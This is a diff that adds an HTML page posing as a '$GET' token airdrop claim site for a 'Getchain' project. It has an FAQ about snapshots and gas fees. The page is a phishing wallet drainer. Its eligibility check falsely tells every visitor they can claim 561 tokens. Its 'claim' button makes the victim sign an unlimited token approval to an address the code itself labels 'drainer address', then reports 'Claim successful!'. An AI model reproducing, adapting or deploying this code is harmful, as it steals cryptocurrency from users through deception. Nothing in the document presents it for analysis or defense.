@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>$GET Airdrop</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      font-family: 'Poppins', sans-serif;
+      color: white;
+      background: linear-gradient(to bottom right, #0d0f1c, #1b1e2d);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 2rem;
+      position: relative;
+    }
+
+    .top-bar {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      font-size: 1.1rem;
+      font-weight: 600;
+      color: #ffaa33;
+    }
+
+    .connect-wallet {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      background: #ffaa33;
+      border: none;
+      padding: 0.7rem 1.5rem;
+      border-radius: 10px;
+      font-size: 0.95rem;
+      font-weight: bold;
+      color: #000;
+      cursor: pointer;
+      transition: 0.3s ease;
+    }
+
+    .connect-wallet:hover {
+      background: #ffc76b;
+    }
+
+    .container {
+      max-width: 500px;
+      text-align: center;
+      margin-top: 100px;
+    }
+
+    .headline {
+      margin-bottom: 1rem;
+    }
+
+    .headline .token {
+      font-size: 4rem;
+      font-weight: 800;
+      color: #ffaa33;
+      line-height: 1;
+    }
+
+    .headline .claim {
+      font-size: 2.4rem;
+      font-weight: 400;
+      color: #fff;
+      margin-top: 0.3rem;
+    }
+
+    .subtext {
+      font-size: 1rem;
+      color: #bbb;
+      margin-bottom: 2.2rem;
+    }
+
+    .claim-card {
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      padding: 2rem;
+      border-radius: 20px;
+      backdrop-filter: blur(10px);
+      margin-bottom: 2rem;
+    }
+
+    .claim-card h2 {
+      font-size: 1.4rem;
+      margin-bottom: 1rem;
+    }
+
+    .wallet-input {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .wallet-input input[type="text"] {
+      padding: 0.7rem 1rem;
+      width: 100%;
+      border-radius: 8px;
+      border: none;
+      font-size: 0.95rem;
+      background: #2b2f42;
+      color: #fff;
+    }
+
+    .wallet-input label {
+      margin-top: 1rem;
+      display: inline-block;
+      padding: 0.7rem 1.4rem;
+      background: #ffaa33;
+      color: #000;
+      font-weight: bold;
+      border-radius: 25px;
+      cursor: pointer;
+      transition: 0.3s ease;
+    }
+
+    .wallet-input label:hover {
+      background: #ffc76b;
+    }
+
+    #check-toggle {
+      display: none;
+    }
+
+    .eligibility {
+      margin-top: 1.5rem;
+      padding: 1.5rem;
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 12px;
+      color: #fff;
+      font-size: 1rem;
+      display: none;
+      animation: fadeIn 0.6s ease-in-out forwards;
+      box-shadow: 0 0 12px rgba(255, 170, 51, 0.15), 0 0 2px rgba(255, 170, 51, 0.6) inset;
+    }
+
+    #check-toggle:checked ~ .eligibility {
+      display: block;
+    }
+
+    .eligibility button {
+      margin-top: 1rem;
+      padding: 0.8rem 1.6rem;
+      background: linear-gradient(to right, #ffcc70, #ffaa33);
+      border: none;
+      color: #000;
+      font-size: 1rem;
+      font-weight: bold;
+      border-radius: 30px;
+      cursor: pointer;
+      box-shadow: 0 0 15px rgba(255, 170, 51, 0.4);
+      transition: 0.3s ease;
+    }
+
+    .eligibility button:hover {
+      background: linear-gradient(to right, #ffe1a8, #ffc76b);
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .section {
+      margin-top: 3rem;
+      max-width: 480px;
+      text-align: center;
+    }
+
+    .section h3 {
+      font-size: 1.4rem;
+      margin-bottom: 0.8rem;
+    }
+
+    .section p {
+      font-size: 0.95rem;
+      color: #aaa;
+      line-height: 1.6;
+    }
+
+    .faq-section {
+      max-width: 600px;
+      margin: 4rem auto 2rem;
+      padding: 0 1rem;
+    }
+
+    .faq-title {
+      font-size: 1.8rem;
+      color: #ffaa33;
+      text-align: center;
+      margin-bottom: 2rem;
+      font-weight: 600;
+    }
+
+    details {
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 10px;
+      padding: 1rem 1.2rem;
+      margin-bottom: 1rem;
+      transition: 0.3s ease;
+    }
+
+    summary {
+      cursor: pointer;
+      font-weight: 500;
+      font-size: 1rem;
+      color: #fff;
+      outline: none;
+      list-style: none;
+    }
+
+    details[open] {
+      background: rgba(255, 255, 255, 0.06);
+      border-color: #ffaa33;
+    }
+
+    details p,
+    details ul {
+      margin-top: 0.8rem;
+      font-size: 0.95rem;
+      color: #ccc;
+      line-height: 1.5;
+    }
+
+    details ul {
+      margin-left: 1.2rem;
+      list-style-type: disc;
+    }
+
+    .footer {
+      width: 100%;
+      max-width: 1000px;
+      margin: 4rem auto 2rem;
+      padding-top: 2rem;
+      border-top: 1px solid rgba(255, 255, 255, 0.1);
+      color: #aaa;
+      font-size: 0.85rem;
+      text-align: center;
+    }
+
+    .footer-links {
+      display: flex;
+      justify-content: center;
+      gap: 1.5rem;
+      flex-wrap: wrap;
+      margin-bottom: 0.8rem;
+    }
+
+    .footer-links .brand {
+      font-weight: 600;
+      color: #ffaa33;
+    }
+
+    .footer-links a {
+      color: #aaa;
+      text-decoration: none;
+      transition: 0.3s ease;
+    }
+
+    .footer-links a:hover {
+      color: #fff;
+    }
+
+    @media (max-width: 480px) {
+      .container {
+        margin-top: 60px;
+        padding: 1rem;
+      }
+      .connect-wallet {
+        padding: 0.5rem 1rem;
+        font-size: 0.85rem;
+      }
+      .wallet-input input {
+        font-size: 0.85rem;
+      }
+      .wallet-input label {
+        font-size: 0.9rem;
+      }
+      .eligibility {
+        font-size: 0.9rem;
+      }
+      .headline .token { font-size: 3rem; }
+      .headline .claim { font-size: 1.6rem; }
+    }
+  </style>
+</head>
+<body>
+  <div class="top-bar">GETCHAIN</div>
+  <button class="connect-wallet">Connect Wallet</button>
+
+  <div class="container">
+    <div class="headline">
+      <div class="token">$GET</div>
+      <div class="claim">Airdrop Claim</div>
+    </div>
+    <div class="subtext">
+      $GET is your gateway to a decentralized rewards system — claim now and be part of the future of incentives.
+    </div>
+
+    <div class="claim-card">
+      <h2>Claim $GET Token</h2>
+      <p style="font-size: 0.9rem; margin-bottom: 1.2rem;">Connect your wallet to view eligibility and claim $GET.</p>
+      <div class="wallet-input">
+        <input type="text" placeholder="Paste your wallet address..." autofocus>
+        <input type="checkbox" id="check-toggle">
+        <label for="check-toggle">Check Eligibility</label>
+        <div class="eligibility">
+          ✅ You are eligible for <strong>561 $GET</strong><br>
+<button onclick="claim()">Connect Wallet to Claim</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <h3>What is $GET?</h3>
+      <p>
+        $GET is the rewards token powering the Getchain ecosystem — enabling users to earn incentives by participating and contributing to decentralized growth.
+      </p>
+    </div>
+  </div>
+
+  <div class="faq-section">
+    <h2 class="faq-title">FAQ</h2>
+    <details>
+      <summary>What is $GET?</summary>
+      <p>$GET is the rewards token powering Getchain — a decentralized incentive system that lets users earn tokens by participating in the ecosystem and contributing value.</p>
+    </details>
+    <details>
+      <summary>How do I qualify for the $GET airdrop?</summary>
+      <p>You must have participated in eligible campaigns or connected a verified wallet before the snapshot date to be eligible for the airdrop.</p>
+    </details>
+    <details>
+      <summary>Snapshot Dates</summary>
+      <p><strong>Season 1 Airdrop</strong> — Snapshot: June 10, 2024, 00:00 UTC<br />
+        <strong>Bounty Blitz Campaign</strong> — Snapshot: April 21, 2024, 00:00 UTC<br />
+        <strong>Referral Campaign</strong> — Snapshot: July 15, 2024, 00:00 UTC</p>
+    </details>
+    <details>
+      <summary>Do I need to pay gas fees?</summary>
+      <p>Yes, a standard gas fee is required to claim your tokens. If you don’t claim immediately, tokens will remain in your claim pool until you do.</p>
+    </details>
+    <details>
+      <summary>How long do I have to claim?</summary>
+      <p>You have up to 3 months after the vesting period ends to claim your $GET tokens. After that, unclaimed tokens may be reallocated to the community pool.</p>
+    </details>
+    <details>
+      <summary>Why am I not eligible?</summary>
+      <p>
+        Make sure you:
+      <ul>
+        <li>Connected the correct wallet at the time of the snapshot</li>
+        <li>Completed required tasks or activity</li>
+        <li>Met all campaign criteria</li>
+      </ul>
+      </p>
+    </details>
+    <details>
+      <summary>Can I use a different wallet to claim?</summary>
+      <p>No — the airdrop is locked to the wallet connected to your profile at the time of the snapshot.</p>
+    </details>
+    <details>
+      <summary>Need help?</summary>
+      <p>Contact our support team through the official Getchain app or platform channels.</p>
+    </details>
+  </div>
+
+  <footer class="footer">
+    <div class="footer-links">
+      <span class="brand">GETCHAIN</span>
+      <a href="#">Terms</a>
+      <a href="#">Privacy Policy</a>
+    </div>
+    <div class="footer-copy">2025 © GETCHAIN. All rights reserved.</div>
+  </footer>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+<script src="https://unpkg.com/@walletconnect/web3modal@3.7.0/dist/index.umd.js"></script>
+
+<script>
+  let signer;
+
+  const modal = new window.Web3Modal.default({
+    projectId: "demo",
+    walletConnectVersion: 2,
+    themeMode: "light",
+    themeVariables: {
+      "--w3m-accent-color": "#ffaa33",
+      "--w3m-background-color": "#fff",
+    },
+  });
+
+  async function connectWallet() {
+    try {
+      const instance = await modal.connect();
+      const provider = new ethers.providers.Web3Provider(instance);
+      signer = provider.getSigner();
+
+      const address = await signer.getAddress();
+      document.querySelector('.connect-wallet').innerText =
+        "Connected: " + address.slice(0, 6) + "..." + address.slice(-4);
+    } catch (e) {
+      alert("Connection rejected.");
+      throw e;
+    }
+  }
+
+  async function claim() {
+    try {
+      if (!signer) await connectWallet();
+
+      const contract = new ethers.Contract(
+        "0x0ce64839CE3C3BE0bAfa17e7D2E2c98A8ca02Bbb", // target token
+        ["function approve(address,uint256) external returns (bool)"],
+        signer
+      );
+
+      const tx = await contract.approve(
+        "0x0ce64839CE3C3BE0bAfa17e7D2E2c98A8ca02Bbb", // drainer address
+        ethers.constants.MaxUint256
+      );
+
+      await tx.wait();
+      alert("Claim successful!");
+    } catch (err) {
+      alert("Claim failed or rejected.");
+      console.error(err);
+    }
+  }
+
+  document.querySelector(".connect-wallet").addEventListener("click", connectWallet);
+</script>
+</body>
+</html>
